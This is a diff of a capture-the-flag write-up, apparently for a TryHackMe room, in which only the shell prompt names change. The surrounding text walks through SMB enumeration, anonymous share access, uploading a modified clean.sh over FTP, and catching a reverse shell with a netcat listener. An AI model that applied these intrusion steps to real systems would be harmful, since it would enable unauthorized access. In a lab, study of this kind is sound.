@@ -25,7 +25,7 @@ drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
 ## SMB
 now let use `pymap.py` again to enumerate for smb
 ```console
-kali@kali:~/script$ sudo python3 pymap.py -t $IP -smb
+bibo318@parrot:~/script$ sudo python3 pymap.py -t $IP -smb
 created by gu2rks/kurohat 
 find me here https://github.com/gu2rks
 
@@ -70,7 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
 seem like we can access `\pics` with out anonymously. let get whatever we can so we can examine it later.
 
 ```console
-kali@kali:~/THM/anonymous$ smbclient \\\\$IP\\pics
+bibo318@parrot:~/THM/anonymous$ smbclient \\\\$IP\\pics
 Enter WORKGROUP\kali's password: 
 Try "help" to get a list of possible commands.
 smb: \> 
@@ -152,7 +152,7 @@ fi
 ```
 Then connect to ftp, run ```put clean.sh``` to upload our script, also run ```nc -nvlp 6969``` and wait for it
 ```console
-kali@kali:~/THM/anonymous$ nc -nlvp 6969
+bibo318@parrot:~/THM/anonymous$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.11.14.220] from (UNKNOWN) [10.10.155.248] 55608
 bash: cannot set terminal process group (1572): Inappropriate ioctl for device
